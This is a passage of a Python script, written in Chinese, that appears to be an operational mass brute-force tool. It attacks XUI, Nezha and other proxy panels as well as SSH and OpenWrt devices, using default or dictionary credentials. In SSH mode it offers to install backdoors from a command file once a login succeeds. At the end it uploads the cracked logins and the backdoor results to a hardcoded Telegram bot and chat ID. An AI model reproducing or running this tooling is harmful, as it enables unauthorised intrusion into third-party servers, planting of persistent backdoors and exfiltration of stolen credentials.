    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass

def choose_template_mode():
    print("请选择爆破模式：")
    print("1.XUI面板爆破  2.哪吒面板爆破")
    print("3.HUI面板爆破  4.咸蛋面板爆破")
    print("5.SUI面板爆破  6.SSH爆破")
    print("7.Sub Store爆破  8.OpenWrt/iStoreOS爆破")
    while True:
        choice = input("输入 1、2、3、4、5、6、7 或 8（默认1）：").strip()
        if choice in ("", "1"):
            return 1
        elif choice == "2":
            return 2
        elif choice == "3":
            return 3
        elif choice == "4":
            return 4 
        elif choice == "5":
            return 5  
        elif choice == "6":
            return 6
        elif choice == "7":
            return 7  
        elif choice == "8":
            return 8                                 
        else:
            print("输入无效，请重新输入。")

def check_environment(template_mode):
    import importlib.util
    import subprocess
    import sys
    import shutil
    import os
    import re
    import platform
    
    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
        try:
            import psutil, requests, openpyxl
        except ImportError:
            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl")
        return

    def run_cmd(cmd, check=True, shell=False, capture_output=False, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        
        stdout = subprocess.DEVNULL if quiet else None
        stderr = subprocess.DEVNULL if quiet else None
        try:
            if capture_output:
                return subprocess.run(cmd, check=check, shell=shell, capture_output=True, text=True, encoding='utf-8', env=env)
            else:
                subprocess.run(cmd, check=check, shell=shell, stdout=stdout, stderr=stderr, env=env)
        except subprocess.CalledProcessError as e:
            if check: raise e
        except FileNotFoundError:
            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。")
            raise

    print(">>> 正在检查并安装依赖环境...")
    
    APT_UPDATED = False
    def ensure_apt_packages(packages):
        nonlocal APT_UPDATED
        sys.stdout.write("    - 正在检查系统包...")
        sys.stdout.flush()
        try:
            if not APT_UPDATED:
                run_cmd(["apt-get", "update", "-y"], quiet=True)
                APT_UPDATED = True
            install_cmd = ["apt-get", "install", "-y"] + packages
            run_cmd(install_cmd, quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

    base_packages = ["python3-pip", "python3-requests", "python3-openpyxl", "python3-psutil", "ca-certificates", "curl", "tar"]
    ensure_apt_packages(base_packages)

    sys.stdout.write("    - 正在更新CA证书...")
    sys.stdout.flush()
    run_cmd(["update-ca-certificates"], quiet=True)
    print(" 完成")

    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- Go环境不满足，正在自动安装... ---")
        run_cmd(["apt-get", "remove", "-y", "golang-go"], check=False, quiet=True) 
        run_cmd(["apt-get", "autoremove", "-y"], check=False, quiet=True)
        
        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        GO_TAR_PATH = "/tmp/go.tar.gz"
        download_success = False
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try:
                subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                download_success = True
                break
            except Exception:
                print(f"      下载失败，尝试下一个源...")
        
        if not download_success:
            print("❌ Go安装包下载失败，请检查网络。")
            sys.exit(1)

        sys.stdout.write("    - 正在解压Go安装包...")
        sys.stdout.flush()
        try:
            run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True)
            run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env:
        go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env:
        go_env['GOCACHE'] = '/tmp/.cache/go-build'

    if template_mode == 6:
        sys.stdout.write("    - 正在安装SSH模块...")
        sys.stdout.flush()
        if not os.path.exists("go.mod"):
            run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
        run_cmd([GO_EXEC, "get", "golang.org/x/crypto/ssh"], quiet=True, extra_env=go_env)
        print(" 完成")

    print(">>> 环境依赖检测完成 ✅\\n")

def load_credentials(template_mode):
    if template_mode == 7:
        usernames = ["2cXaAxRGfddmGz2yx1wA"]
        use_custom = input("是否使用 password.txt 路径库？(y/N，默认使用 2cXaAxRGfddmGz2yx1wA 作为路径): ").strip().lower()
        if use_custom == 'y':
            if not os.path.exists("password.txt"):
                print("❌ 错误: 缺少 password.txt 文件，请检查后重试")
                sys.exit(1)
            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
            if not passwords:
                print("❌ 错误: password.txt 文件为空，请添加密码后再试。")
                sys.exit(1)
        else:
            passwords = ["2cXaAxRGfddmGz2yx1wA"]
    else:
        use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，默认使用 admin/admin 或 sysadmin/sysadmin 或 root/password): ").strip().lower()
        if use_custom == 'y':
            if not os.path.exists("username.txt"):
                print("❌ 错误: 缺少 username.txt 文件，请检查后重试。")
                sys.exit(1)
            if not os.path.exists("password.txt"):
                print("❌ 错误: 缺少 password.txt 文件，请检查后重试。")
                sys.exit(1)

            usernames = [line for line in open("username.txt", encoding='utf-8').read().splitlines() if line.strip()]
            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]

            if not usernames:
                print("❌ 错误: username.txt 文件为空，请添加用户名后再试。")
                sys.exit(1)
            if not passwords:
                print("❌ 错误: password.txt 文件为空，请添加密码后再试。")
                sys.exit(1)
        else:
            if template_mode == 3:
                usernames = ["sysadmin"]
                passwords = ["sysadmin"]
            elif template_mode == 8:
                usernames = ["root"]
                passwords = ["password"]
            else:
                usernames = ["admin"]
                passwords = ["admin"]
    return usernames, passwords

if __name__ == "__main__":
        start = time.time()
        interrupted = False
        final_result_file = None
        
        TEMP_PART_DIR = "temp_parts"
        TEMP_XUI_DIR = "xui_outputs"
        TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
        TEMP_HMFAIL_DIR = "temp_hmfail"

        try:
                # 检查是否在交互式终端中运行
                if not sys.stdout.isatty():
                    print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
                    sys.exit(1)

                TEMPLATE_MODE = choose_template_mode()
                
                check_environment(TEMPLATE_MODE)
                
                # 在环境检查后导入
                import psutil
                import requests
                from openpyxl import Workbook, load_workbook
                from openpyxl.utils import get_column_letter

                adjust_oom_score()
                check_and_manage_swap()

                os.makedirs(TEMP_PART_DIR, exist_ok=True)
                os.makedirs(TEMP_XUI_DIR, exist_ok=True)
                os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
                os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)

                INSTALL_BACKDOOR = False
                CUSTOM_BACKDOOR_CMDS = []

                if TEMPLATE_MODE == 6:
                    choice = input("是否在SSH爆破成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
                    if choice == 'y':
                        INSTALL_BACKDOOR = True
                        if not os.path.exists("后门命令.txt"):
                            print("❌ 你选择了安装后门，但未找到 后门命令.txt，已中止爆破。")
                            sys.exit(1)
                        with open("后门命令.txt", encoding='utf-8') as f:
                            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]

                print("=== 爆破一键启动 ===")
                input_file = input_filename_with_default("请输入源文件名", "1.txt")
                if not os.path.exists(input_file):
                        print(f"❌ 错误: 文件 '{input_file}' 不存在。")
                        sys.exit(1)

                lines_per_file = input_with_default("每个小文件行数", 5000)
                sleep_seconds = input_with_default("爆破完休息秒数", 2)
                semaphore_size = input_with_default("爆破线程数", 250)
                
                if semaphore_size > 5000:
                    print("\\n" + "="*50)
                    print("⚠️  警告: 您设置的线程数非常高 (>5000)。 ⚠️")
                    print("这可能会消耗大量内存并导致脚本被系统终止。")
                    print("建议将线程数设置在 200-2000 范围内。")
                    print("="*50 + "\\n")
                    confirm = input("是否确定要继续？(y/N): ").strip().lower()
                    if confirm != 'y':
                        print("操作已取消。")
                        sys.exit(0)

                usernames, passwords = load_credentials(TEMPLATE_MODE)
                
                template_map = {
                    1: (generate_xui_go, (semaphore_size, usernames, passwords)),
                    2: (generate_xui_go_template2, (semaphore_size, usernames, passwords)),
                    3: (generate_xui_go_template3, (semaphore_size, usernames, passwords)),
                    4: (generate_xui_go_template4, (semaphore_size, usernames, passwords)),
                    5: (generate_xui_go_template5, (semaphore_size, usernames, passwords)),
                    6: (generate_xui_go_template6, (semaphore_size, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)),
                    7: (generate_xui_go_template7, (semaphore_size, usernames, passwords)),
                    8: (generate_xui_go_template8, (semaphore_size, usernames, passwords)),
                }

                gen_func, args = template_map[TEMPLATE_MODE]
                gen_func(*args)

                executable = compile_go_program()
                generate_ipcx_py()
                split_file(input_file, lines_per_file)
                run_xui_for_parts(sleep_seconds, executable)
                
                merge_xui_files()
                merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
                merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)

                run_ipcx()

                from datetime import datetime, timedelta, timezone

                beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
                time_str = beijing_time.strftime("%Y%m%d-%H%M")
                
                mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
                prefix = mode_map.get(TEMPLATE_MODE, "result")

                if os.path.exists("xui.txt"):
                    final_result_file = f"{prefix}-{time_str}.txt"
                    os.rename("xui.txt", final_result_file)
                if os.path.exists("xui.xlsx"):
                    os.rename("xui.xlsx", f"{prefix}-{time_str}.xlsx")
                if os.path.exists("hmsuccess.txt"):
                    os.rename("hmsuccess.txt", f"后门安装成功-{time_str}.txt")
                if os.path.exists("hmfail.txt"):
                    os.rename("hmfail.txt", f"后门安装失败-{time_str}.txt")

        except KeyboardInterrupt:
                print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
                interrupted = True
        except SystemExit as e:
                print(f"\\n脚本因环境问题中止。")
        except EOFError:
                print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
                interrupted = True
        finally:
                clean_temp_files()
                end = time.time()
                cost = int(end - start)

                if interrupted:
                        print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
                else:
                        print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")

                def send_to_telegram(file_path, bot_token, chat_id):
                        if not os.path.exists(file_path):
                                print(f"⚠️ Telegram 上传失败：文件 {file_path} 不存在")
                                return
                        
                        if os.path.getsize(file_path) == 0:
                                print(f"⚠️ Telegram 上传失败：文件 {file_path} 为空")
                                return

                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        with open(file_path, "rb") as f:
                                files = {'document': f}
                                data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
                                try:
                                        response = requests.post(url, data=data, files=files)
                                        if response.status_code == 200:
                                                print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                        else:
                                                print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                                except Exception as e:
                                        print(f"❌ 发送到 TG 失败：{e}")

                BOT_TOKEN = "7664203362:AAEWd52ZdliweeDvrV30MuwE2JcZQDWZIwQ"
                CHAT_ID = "7697235358"

                if BOT_TOKEN and CHAT_ID:
                    if final_result_file and os.path.exists(final_result_file):
                            print(f"\\n📤 正在将 {final_result_file} 上传至 Telegram ...")
                            send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)

                            xlsx_file = final_result_file.replace(".txt", ".xlsx")
                            if os.path.exists(xlsx_file):
                                    print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
                                    send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
                            
                            success_file = f"后门安装成功-{time_str}.txt"
                            fail_file    = f"后门安装失败-{time_str}.txt"

                            if os.path.exists(success_file):
                                    print(f"📤 正在将 {success_file} 上传至 Telegram ...")
                                    send_to_telegram(success_file, BOT_TOKEN, CHAT_ID)

                            if os.path.exists(fail_file):
                                    print(f"📤 正在将 {fail_file} 上传至 Telegram ...")
                                    send_to_telegram(fail_file, BOT_TOKEN, CHAT_ID)
